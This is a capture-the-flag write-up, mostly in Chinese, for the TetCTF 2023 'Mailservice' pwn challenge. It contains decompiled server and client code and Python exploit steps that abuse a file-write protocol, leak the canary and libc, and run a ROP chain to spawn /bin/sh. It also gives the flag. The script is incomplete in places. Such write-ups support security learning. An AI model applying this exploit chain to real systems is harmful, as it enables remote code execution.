---
title: TetCTF 2023: Mailservice
contest: TetCTF
year: 2023
difficulty: hard
vuln_type: pwn_unknown
tags: [mail-service, update-event-protocol, set-new-ate-atf-commands, bof-leak, canary-pie-libc, custom-mail-payload]
attack_chain:
- Mail server 监听 eventfd 接收 4 类命令: UPD/SET/NEW/ATE/ATF
- UPD 触发 system("echo 1 > /tmp/need_update")
- SET 改 bin_path
- NEW 写文件
- ATE 追加写文件
- ATF 插入数据到文件头部
- 攻击者发邮件给 update.event@hackemall.live 触发 update.event
- build_packet: cmd + 3 位 length + data
- SET /tmp/evil; NEW 0x10000 空数据; ATE 0x804 A
- 写 /home/mailserver/data/<user> 主题 "NEW34|..." 注入 payload
- NEW 0x34 + canary + PIE + ROP chain (长度字段）
- 后续 ATF 追加 0x804 填充 + ROP
- 邮件客户端读邮件触发栈溢出
- canary 0x1d5f307b787f8c00, libc base 0x7feaecc9a000
- execve("/bin/sh", 0, 0)
- flag: TetCTF{2b15f22179fc01196b2e673764e45a7f}
key_payload: send_event(build_packet(b"ATF", payload + 0x804 A))
one_liner: TetCTF 2023 Mail Service：mailclient 读邮件栈溢出 + 攻击 mailserver update.event 写任意文件 + ROP。
lesson: 当协议允许任意文件写入时，可写 mail 内容主题字段注入 ROP 链；邮件客户端解析主题时触发栈溢出。
quality: high
---
# TetCTF 2023: Mailservice

## Mail Server 协议
```c
struct packet {
    uint32_t signal;   // 'ATF' / 'SET' / 'NEW' / 'ATE' / 'UPD'
    uint32_t len;
    char buf[0x400];
}

// 'ATF' - 头部插入数据
if (rax_3 == 'ATF') {
    sscanf(&data, &data_2799, &len);
    fopen(bin_path, "r+");
    fseek(filp, 0, 2); size = ftell(filp); fseek(filp, 0, 0);
    ptr = calloc(size + len + 1, 1);
    memcpy(ptr, &data, len);  // ATF 写头部
    fread(len + ptr, 1, size, filp);
    fwrite(ptr, 1, size + len, filp);
}

// 'SET' - 改 bin_path
// 'NEW' - 写新文件
// 'ATE' - 追加写
// 'UPD' - 触发 system("echo 1 > /tmp/need_update")
```

## Mail Client 漏洞
```c
// 读邮件 read() + 0x808 buffer
// 邮件主题字段 "SUBJECT|CONTENT_PATH"
char* rax_26 = strrchr(&var_c28.data, 0x7c);  // |
*(int8_t*)rax_26 = 0;
int32_t rax_33 = open(&rax_26[1], 0);  // 打开 CONTENT_PATH
read(rax_33, &var_820, 4);
int32_t rax_44 = atoi(&var_820);
read(rax_33, &var_818, rax_44);  // 读 rax_44 字节
write(1, &var_818, rax_44);     // 写到 stdout
```

如果邮件主题中 CONTENT_PATH 是恶意文件 + 文件内容中 atoi 大小被攻击者控制，可导致栈溢出。

## 攻击流程

### 1. 触发 mailserver 写文件
```python
def build_packet(cmd, data, length=None):
    if length is None: length = len(data)
    return cmd + str(length).zfill(3).encode() + data

def send_event(data, content=None):
    if content is None:
        content = "I swear on my life, I always try, but in my eye, I can fly. Better luck next time.\n"
    send("update.event", data, content)

# 写大文件触发溢出
send_event(build_packet(b"SET", b"/tmp/evil"))
send_event(build_packet(b"NEW", str(size).zfill(4).encode() + data))  # size = 0x10000
send_event(build_packet(b"SET", f"/home/mailserver/data/{username}".encode()))
send_event(build_packet(b"NEW", b"pwned", len("pwned") + 1))
send_event(build_packet(b"ATE", b"/tmp/evil"))
```

### 2. 泄露 canary + libc
```python
custom_mail(username, b"", size=0x10000)
_, leaks = read()
leaks = leaks[0x808:]
canary = u64(leaks[:8])
e.address = u64(leaks[16:24]) - 0x2335
libc.address = u64(leaks[64:72]) - 0x29d90
```

### 3. ROP 链写入
```python
rop = ROP(libc)
rop.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)
payload = flat(canary, e.address + 0x4000, rop.chain())

# 写 payload 到主题字段
send_event(b"NEW" + b"34", payload)  # 34 长度
# 触发 ATF 追加 0x804 A 填充
to_add = str(0x808 + len(payload)).zfill(4).encode() + b"A"*0x804
for chunk in chunks[::-1]:
    send_event(build_packet(b"ATF", chunk))
mail_file(username, filname)
p.sendline("cd /home/mailclient")
p.sendline("cat flag*")
```

## flag
```
TetCTF{2b15f22179fc01196b2e673764e45a7f}
```
